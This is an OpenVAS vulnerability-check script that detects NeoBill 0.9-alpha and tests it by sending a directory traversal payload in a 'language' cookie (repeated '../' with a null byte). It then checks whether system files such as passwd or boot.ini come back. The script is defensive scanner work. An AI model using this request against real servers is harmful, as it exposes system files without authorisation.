###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_neobill_mult_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# NeoBill Multiple Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804226");
  script_version("$Revision: 7577 $");
  script_bugtraq_id(64112);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2014-01-23 13:48:00 +0530 (Thu, 23 Jan 2014)");
  script_name("NeoBill Multiple Vulnerabilities");

  script_tag(name : "summary" , value : "This host is running NeoBill and is prone to multiple vulnerabilities.");
  script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP GET request and check whether it
  is able to read config file.");
  script_tag(name : "insight" , value : "Flaw exists in 'whois.utils.php', 'example.php' and 'solidstate.php' scripts,
  which fail to properly sanitize user-supplied input to 'query' and other
  parameter's");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute SQL commands,
  obtain sensitive information and execute arbitrary commands.

  Impact Level: Application/System");
  script_tag(name : "affected" , value : "NeoBill version NeoBill 0.9-alpha, Other versions may also be affected.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/124307");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/89516");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
http_port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

## Iterate over possible paths
foreach dir (make_list_unique("/", "/nb", "/neobill", "/bill", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  req = http_get(item:string(dir, "/install/index.php"),  port:http_port);
  res = http_keepalive_send_recv(port:http_port, data:req);

  ## confirm the Application
  if(res &&  "NeoBill :: Open Source Customer Management and Billing Software for Web Hosts" >< res)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct Attack Request
      url = dir + "/install/index.php";

      cookie = "language=" + crap(data:"../", length:3*15) + files[file] + "%00";

      req = string("GET ", url, " HTTP/1.0\r\n",
                   "Host: ", host, "\r\n",
                   "Cookie: ", cookie, "\r\n\r\n");

      res = http_keepalive_send_recv(port:http_port, data:req);

      ## Check the response to confirm vulnerability
      if(res && egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res))
      {
        security_message(port:http_port);
        exit(0);
      }
    }
  }
}

exit(99);